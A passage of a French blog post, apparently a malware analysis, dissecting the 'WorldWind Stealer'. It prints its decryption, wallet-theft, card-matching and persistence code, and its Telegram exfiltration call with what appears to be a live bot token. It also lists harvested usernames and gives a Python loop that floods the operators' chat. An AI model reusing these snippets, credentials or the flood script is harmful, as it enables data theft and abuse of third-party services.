+</span></span><span style="display:flex;"><span>rivate <span style="color:#66d9ef">static</span> readonly byte[] Salt <span style="color:#f92672">=</span> new byte[]{<span style="color:#ae81ff">191</span>,<span style="color:#ae81ff">235</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">86</span>,<span style="color:#ae81ff">251</span>,<span style="color:#ae81ff">205</span>,<span style="color:#ae81ff">151</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">178</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">36</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">165</span>,<span style="color:#ae81ff">120</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">86</span>,<span style="color:#ae81ff">68</span>,<span style="color:#ae81ff">210</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">185</span>,<span style="color:#ae81ff">212</span>,<span style="color:#ae81ff">241</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">231</span>,<span style="color:#ae81ff">230</span>,<span style="color:#ae81ff">195</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">65</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>public <span style="color:#a6e22e">Aes256</span>(string masterKey)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (string.<span style="color:#a6e22e">IsNullOrEmpty</span>(masterKey))
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				throw new <span style="color:#a6e22e">ArgumentException</span>(<span style="color:#e6db74">&#34;masterKey can not be null or empty.&#34;</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">using</span> (Rfc2898DeriveBytes rfc2898DeriveBytes <span style="color:#f92672">=</span> new <span style="color:#a6e22e">Rfc2898DeriveBytes</span>(masterKey, Aes256.Salt, <span style="color:#ae81ff">50000</span>))
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				this._key <span style="color:#f92672">=</span> rfc2898DeriveBytes.<span style="color:#a6e22e">GetBytes</span>(<span style="color:#ae81ff">32</span>);
+</span></span><span style="display:flex;"><span>				this._authKey <span style="color:#f92672">=</span> rfc2898DeriveBytes.<span style="color:#a6e22e">GetBytes</span>(<span style="color:#ae81ff">64</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p>Puis aprés 300 lignes de codes , on obtient :</p>
+<p><img src="./img/string2.png" alt="All text"></p>
+<p>La fonction La plus important est celle ci :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> string <span style="color:#a6e22e">Decrypt</span>(byte[] bytesToBeDecrypted)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		byte[] bytes <span style="color:#f92672">=</span> null;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">using</span> (MemoryStream memoryStream <span style="color:#f92672">=</span> new <span style="color:#a6e22e">MemoryStream</span>())
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">using</span> (RijndaelManaged rijndaelManaged <span style="color:#f92672">=</span> new <span style="color:#a6e22e">RijndaelManaged</span>())
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			rijndaelManaged.KeySize <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>			rijndaelManaged.BlockSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>;
+</span></span><span style="display:flex;"><span>			Rfc2898DeriveBytes rfc2898DeriveBytes <span style="color:#f92672">=</span> new <span style="color:#a6e22e">Rfc2898DeriveBytes</span>(Program.cryptKey, Program.saltBytes, <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>			rijndaelManaged.Key <span style="color:#f92672">=</span> rfc2898DeriveBytes.<span style="color:#a6e22e">GetBytes</span>(rijndaelManaged.KeySize <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>			rijndaelManaged.IV <span style="color:#f92672">=</span> rfc2898DeriveBytes.<span style="color:#a6e22e">GetBytes</span>(rijndaelManaged.BlockSize <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>			rijndaelManaged.Mode <span style="color:#f92672">=</span> CipherMode.CBC;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">using</span> (CryptoStream cryptoStream <span style="color:#f92672">=</span> new <span style="color:#a6e22e">CryptoStream</span>(memoryStream, rijndaelManaged.<span style="color:#a6e22e">CreateDecryptor</span>(), CryptoStreamMode.Write))
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>			cryptoStream.<span style="color:#a6e22e">Write</span>(bytesToBeDecrypted, <span style="color:#ae81ff">0</span>, bytesToBeDecrypted.Length);
+</span></span><span style="display:flex;"><span>			cryptoStream.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			bytes <span style="color:#f92672">=</span> memoryStream.<span style="color:#a6e22e">ToArray</span>();
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> Encoding.UTF8.<span style="color:#a6e22e">GetString</span>(bytes);
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>Tout le programme est disponible <a href="./files/getstring.zip">ici</a></p>
+<p>La chose la plus intéréssante ici est le token du bot Télégram . Nous verrons ensuite ce que nous pouvons en faire .</p>
+<h4 id="autres-fonctions">Autres fonctions</h4>
+<p>On retrouve d&rsquo;autres fonctions assez classique pour un virus :</p>
+<ul>
+<li>Un BitCoinAdress Clipper</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> string <span style="color:#a6e22e">GetText</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  string ReturnValue <span style="color:#f92672">=</span> string.Empty;
+</span></span><span style="display:flex;"><span>  try
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    Thread <span style="color:#66d9ef">thread</span> <span style="color:#f92672">=</span> new <span style="color:#a6e22e">Thread</span>(<span style="color:#a6e22e">delegate</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      ReturnValue <span style="color:#f92672">=</span> Clipboard.<span style="color:#a6e22e">GetText</span>();
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">thread</span>.<span style="color:#a6e22e">SetApartmentState</span>(ApartmentState.STA);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">thread</span>.<span style="color:#a6e22e">Start</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">thread</span>.<span style="color:#a6e22e">Join</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  catch
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ReturnValue;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>Une pseudo antiDebug (Faciment Bypassable)</li>
+<li>Un stealer de cookies NordVpn/OpenVpn/ProtonVpn</li>
+<li>Un stealer de mots de passes Wifi (commande cmd &ldquo;netsh &hellip;&rdquo;)</li>
+<li>Une fonction pour prendre des screenshots de l&rsquo;écran .</li>
+<li>Une execution de commandes à distance.</li>
+<li>Un DiscordToken Grabber.</li>
+<li>Du code pour voler des sessions télégram :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>private <span style="color:#66d9ef">static</span> string <span style="color:#a6e22e">GetTdata</span>()
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			string result <span style="color:#f92672">=</span> Environment.<span style="color:#a6e22e">GetFolderPath</span>(Environment.SpecialFolder.ApplicationData) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Telegram Desktop</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">tdata&#34;</span>;
+</span></span><span style="display:flex;"><span>			Process[] processesByName <span style="color:#f92672">=</span> Process.<span style="color:#a6e22e">GetProcessesByName</span>(<span style="color:#e6db74">&#34;Telegram&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (processesByName.Length <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> Path.<span style="color:#a6e22e">Combine</span>(Path.<span style="color:#a6e22e">GetDirectoryName</span>(ProcessList.<span style="color:#a6e22e">ProcessExecutablePath</span>(processesByName[<span style="color:#ae81ff">0</span>])), <span style="color:#e6db74">&#34;tdata&#34;</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><ul>
+<li>Un stealer de comptes Steam/Minecraft/Uplay grâce aux fichiers temporaires .</li>
+<li>Un stealer de comptes pré-enregistrés sur navigateurs (voir screen plus haut)</li>
+<li>Un stealer de wallets crypto.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>private <span style="color:#66d9ef">static</span> List<span style="color:#f92672">&lt;</span>string[]<span style="color:#f92672">&gt;</span> sWalletsDirectories <span style="color:#f92672">=</span> new List<span style="color:#f92672">&lt;</span>string[]<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Zcash&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Zcash&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Armory&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Armory&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Bytecoin&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bytecoin&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Jaxx&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">com.liberty.jaxx</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">IndexedDB</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">file__0.indexeddb.leveldb&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Exodus&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Exodus</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">exodus.wallet&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Ethereum&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Ethereum</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">keystore&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Electrum&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Electrum</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">wallets&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;AtomicWallet&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">atomic</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Local Storage</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">leveldb&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Guarda&#34;</span>,Paths.appdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Guarda</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Local Storage</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">leveldb&#34;</span>},
+</span></span><span style="display:flex;"><span>  new string[]{<span style="color:#e6db74">&#34;Coinomi&#34;</span>,Paths.lappdata <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Coinomi</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Coinomi</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">wallets	}</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><ul>
+<li>Un stealer de cartes bancaires :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>private <span style="color:#66d9ef">static</span> Dictionary<span style="color:#f92672">&lt;</span>string, Regex<span style="color:#f92672">&gt;</span> CreditCardTypes <span style="color:#f92672">=</span> new Dictionary<span style="color:#f92672">&lt;</span>string, Regex<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Amex Cardnew Regex(&#34;</span><span style="color:#f92672">^</span><span style="color:#ae81ff">3</span>[<span style="color:#ae81ff">47</span>][<span style="color:#ae81ff">0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>]{<span style="color:#ae81ff">13</span>}<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#e6db74">&#34;)},</span>
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;BCGlobal&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(6541|6556)[0-9]{12}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Carte Blanche Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^389[0-9]{11}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Diners Club Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^3(?:0[0-5]|[68][0-9])[0-9]{11}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Discover Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;6(?:011|5[0-9]{2})[0-9]{12}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Insta Payment Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^63[7-9][0-9]{13}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;JCB Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(?:2131|1800|35</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">d{3})</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">d{11}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;KoreanLocalCard&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^9[0-9]{15}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Laser Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(6304|6706|6709|6771)[0-9]{12,15}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Maestro Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Mastercard&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;5[1-5][0-9]{14}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Solo Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Switch Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Union Pay Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(62[0-9]{14,17})$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Visa Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;4[0-9]{12}(?:[0-9]{3})?$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Visa Master Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$&#34;</span>)},
+</span></span><span style="display:flex;"><span>		{<span style="color:#e6db74">&#34;Express Card&#34;</span>,new <span style="color:#a6e22e">Regex</span>(<span style="color:#e6db74">&#34;3[47][0-9]{13}$&#34;</span>)}
+</span></span><span style="display:flex;"><span>	};
+</span></span></code></pre></div><ul>
+<li>Des fonctions de persistances :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>Process.<span style="color:#a6e22e">Start</span>(new ProcessStartInfo
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	FileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd&#34;</span>,
+</span></span><span style="display:flex;"><span>	Arguments <span style="color:#f92672">=</span> string.<span style="color:#a6e22e">Concat</span>(new string[]
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;/c schtasks /create /f /sc onlogon /rl highest /tn </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>	Path.<span style="color:#a6e22e">GetFileNameWithoutExtension</span>(fileInfo.Name),
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> /tr &#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>	fileInfo.FullName,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39; &amp; exit&#34;</span>
+</span></span><span style="display:flex;"><span>	}),
+</span></span><span style="display:flex;"><span>	WindowStyle <span style="color:#f92672">=</span> ProcessWindowStyle.Hidden,
+</span></span><span style="display:flex;"><span>	CreateNoWindow <span style="color:#f92672">=</span> true
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Il n&rsquo;y as pas grand chose d&rsquo;autres d&rsquo;intéréssant à par le nom du malware : &ldquo;WorldWind Stealer&rdquo;
+Le nom traine un peu partout et une bref recherche nous permet de retrouver le builder de l&rsquo;implant.</p>
+<h5 id="du-coté-de-télégram">Du coté de télégram</h5>
+<p>Dans le code on retrouve 2 tokens , le premier est celui du bot &ldquo;Virus&rdquo; .
+Malheuresement celui si semble éteint ou supprimés :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;ok&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;error_code&#34;</span>:<span style="color:#ae81ff">401</span>,<span style="color:#f92672">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;Unauthorized&#34;</span>}
+</span></span></code></pre></div><p>On revanche on a une autre url en clair dans le payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>httpClient2.PostAsync<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/send&#34;</span> + type + <span style="color:#e6db74">&#34;?chat_id=1096425866&#34;</span>, multipartFormDataContent2<span style="color:#f92672">)</span>.Wait<span style="color:#f92672">()</span>;
+</span></span></code></pre></div><p>On en récupère</p>
+<ul>
+<li>un chatID : 1096425866</li>
+<li>un token : 1119746739:AAGMhvpUjXI4CzIfizRC&ndash;VXilxnkJlhaf8</li>
+</ul>
+<p>En allant sur cette url : <a href="https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/getUpdates" target="_blank">https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/getUpdates</a></p>
+<p>On retrouve un grand nombre de personne.
+Cet url étant stocké dans le code sans variable, je suppose que c&rsquo;est le groupe des clients de &ldquo;WoldWind Stealer&rdquo;
+De plus , une vérication du groupe est fait lors de l&rsquo;envoie des informations d&rsquo;une victime a un des pirates .
+Cette fonction est une sorte de sécurité pour garder le controle des channels ou le bot peut envoyer les informations privées :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text <span style="color:#f92672">!=</span> Settings.TelegramChatID)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		string text2 <span style="color:#f92672">=</span> jsonnode2[<span style="color:#e6db74">&#34;chat&#34;</span>][<span style="color:#e6db74">&#34;username&#34;</span>];
+</span></span><span style="display:flex;"><span>		string str <span style="color:#f92672">=</span> jsonnode2[<span style="color:#e6db74">&#34;chat&#34;</span>][<span style="color:#e6db74">&#34;first_name&#34;</span>];
+</span></span><span style="display:flex;"><span>		telegram.<span style="color:#a6e22e">sendText</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\ud83d\udc51</span><span style="color:#e6db74"> You not my owner &#34;</span> <span style="color:#f92672">+</span> str);
+</span></span><span style="display:flex;"><span>		telegram.<span style="color:#a6e22e">sendText</span>(string.<span style="color:#a6e22e">Concat</span>(new string[]
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\ud83d\udc51</span><span style="color:#e6db74"> Unknown user with id &#34;</span>,
+</span></span><span style="display:flex;"><span>			text,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34; and username @&#34;</span>,
+</span></span><span style="display:flex;"><span>			text2,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34; send command to bot!&#34;</span>
+</span></span><span style="display:flex;"><span>		}));
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>On peut donc en tirer une liste de 100 utilisateurs :</p>
+<pre tabindex="0"><code>Stella940628
+Laura282924
+Lysandra815159
+Spielberg500867
+Winifred927624
+Sarah973325
+Julia465280
+Steven756717
+
+...
+
+Veronica290343
+Acacia506278
+lover252655
+moamoa553528
+Laura799863
+Pandora313304
+</code></pre><p>Finalement, on peut les spam sur cette url parce que c&rsquo;est fun aprés tout:</p>
+<p><a href="https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/sendMessage?chat_id=-1001512673124&amp;text=Pwned" target="_blank">https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/sendMessage?chat_id=-1001512673124&text=Pwned</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/sendMessage?chat_id=-1001512673124&amp;text=Pwned&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">True</span>):
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#39;ok&#34;:true&#39;</span> <span style="color:#f92672">in</span> requests<span style="color:#f92672">.</span>get(url)<span style="color:#f92672">.</span>text):
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#39;Flood&#39;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p><img src="./img/final.png" alt="All text">
+<img src="./img/flood.png" alt="All text"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll-2/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Execution de ShellCode grâce au Dll Hidjacking</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/posts/anti-cheat-ctf/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Lutter contre la triche en CTF ?</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#commencement">Commencement</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
